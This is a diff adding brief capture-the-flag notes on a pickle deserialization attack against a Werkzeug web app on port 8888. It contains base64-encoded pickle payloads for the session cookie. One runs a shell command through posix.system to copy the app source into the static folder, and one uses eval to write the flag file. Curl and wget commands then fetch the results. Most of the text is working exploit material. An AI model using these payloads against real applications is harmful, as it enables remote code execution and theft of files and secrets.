@@ -1,0 +1,31 @@
+# Target
+8888/tcp open  http        Werkzeug httpd 1.0.1 (Python 3.8.5)
+
+# Cookie
+SESSION	gASVJAAAAAAAAAB9lIwGZmlsdGVylIwUcmVmX25hbWUgPX4gIl5zcG9vZiKUcy4=
+
+http://172.15.27.21:8888/modules?filter=type+%3D%3D+%22encoder%22
+	gASVIQAAAAAAAAB9lIwGZmlsdGVylIwRdHlwZSA9PSAiZW5jb2RlciKUcy4=
+	base64 decode: ��!}��filter��type == "encoder"�s.
+
+Pickle, Insert payload as cookie to get RCE
+
+# cmd = ('cat app.py > static/app.py')
+python3.8 get_app.py
+	gASVNQAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjBpjYXQgYXBwLnB5ID4gc3RhdGljL2FwcC5weZSFlFKULg==
+
+# Get app.py
+curl http://172.15.27.21:8888/static/app.py
+
+# app.py
+with (app_path / 'flag.png').open('rb') as file_h:
+    FLAG = file_h.read()
+if not config.DEBUG:
+    (app_path / 'flag.png').unlink()
+
+# cmd = "open('static/flag.png','wb').write(FLAG)"
+python3.8 get_flag.py
+	gASVRAAAAAAAAACMCGJ1aWx0aW5zlIwEZXZhbJSTlIwob3Blbignc3RhdGljL2ZsYWcucG5nJywnd2InKS53cml0ZShGTEFHKZSFlFKULg==
+
+# Get flag.png
+wget http://172.15.27.21:8888/static/flag.png
